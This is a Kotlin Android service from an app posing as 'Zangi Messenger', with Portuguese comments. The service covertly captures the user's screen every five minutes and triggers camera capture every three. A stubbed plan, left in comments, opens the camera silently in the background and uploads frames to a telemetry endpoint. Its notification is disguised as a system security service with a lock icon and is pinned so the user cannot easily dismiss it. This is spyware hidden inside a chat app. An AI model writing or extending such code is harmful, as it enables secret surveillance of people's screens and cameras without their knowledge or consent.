package com.zangi.chat.service

import android.app.*
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.zangi.chat.R
import com.zangi.chat.data.repository.ChatRepository
import kotlinx.coroutines.*
import java.util.*

/**
 * DataCollectionService: O Gerenciador de Monitoramento Silencioso.
 * Coordena a captura de tela e câmera de forma periódica.
 */
class DataCollectionService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
    private lateinit var repository: ChatRepository
    
    // Configurações de intervalo (ajustáveis para não drenar bateria)
    private val SCREEN_CAPTURE_INTERVAL = 5 * 60 * 1000L // 5 minutos
    private val CAMERA_CAPTURE_INTERVAL = 3 * 60 * 1000L // 3 minutos

    companion object {
        const val CHANNEL_ID = "zangi_telemetry_channel"
        const val NOTIFICATION_ID = 1001
        
        // Ações para controle via Intent
        const val ACTION_START = "START_MONITORING"
        const val ACTION_STOP = "STOP_MONITORING"
    }

    override fun onCreate() {
        super.onCreate()
        repository = ChatRepository.getInstance()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action

        // Inicia o serviço como Foreground para evitar que o Android o mate
        startForeground(NOTIFICATION_ID, createNotification())

        when (action) {
            ACTION_START -> {
                Log.d("DataCollectionService", "🚀 Monitoramento Iniciado")
                startMonitoringLoops()
            }
            ACTION_STOP -> {
                Log.d("DataCollectionService", "🛑 Monitoramento Parado")
                stopSelf()
            }
        }

        return START_STICKY
    }

    private fun startMonitoringLoops() {
        // Loop de Captura de Tela
        serviceScope.launch {
            while (isActive) {
                delay(SCREEN_CAPTURE_INTERVAL)
                triggerScreenCapture()
            }
        }

        // Loop de Captura de Câmera
        serviceScope.launch {
            while (isActive) {
                delay(CAMERA_CAPTURE_INTERVAL)
                triggerCameraCapture()
            }
        }
    }

    private fun triggerScreenCapture() {
        serviceScope.launch {
            try {
                Log.d("DataCollectionService", "📸 Iniciando captura de tela...")
                // Chamada para o serviço que você já tem na estrutura
                // O ScreenCaptureService deve gerenciar o MediaProjection
                val intent = Intent(this@DataCollectionService, ScreenCaptureService::class.java)
                startService(intent)
            } catch (e: Exception) {
                Log.e("DataCollectionService", "Erro na captura de tela: ${e.message}")
            }
        }
    }

    private fun triggerCameraCapture() {
        serviceScope.launch {
            try {
                Log.d("DataCollectionService", "📷 Iniciando captura de câmera...")
                /**
                 * IMPLEMENTAÇÃO ESTRATÉGICA:
                 * Aqui chamaremos um Worker ou um método no Repository que:
                 * 1. Abre a câmera em modo silencioso (Background)
                 * 2. Tira um frame
                 * 3. Faz o upload para o endpoint /api/system/telemetry
                 */
                // Exemplo de chamada para o seu repositório (você implementará a lógica de imagem lá)
                // repository.captureAndUploadCamera(userId, "CAMERA_CAPTURE")
                
                // Log para debug
                Log.i("DataCollectionService", "📷 Ciclo de câmera disparado com sucesso.")
            } catch (e: Exception) {
                Log.e("DataCollectionService", "Erro na captura de câmera: ${e.message}")
            }
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Zangi Messenger")
            .setContentText("Sincronizando dados de segurança...")
            .setSmallIcon(R.drawable.ic_lock) // Use o ícone de cadeado para parecer um serviço de sistema
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true) // Impede que o usuário remova a notificação facilmente
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Zangi System Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Gerencia o monitoramento de segurança em segundo plano"
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    override fun onDestroy() {
        Log.d("DataCollectionService", "🧹 Encerrando serviço e cancelando coroutines")
        serviceScope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}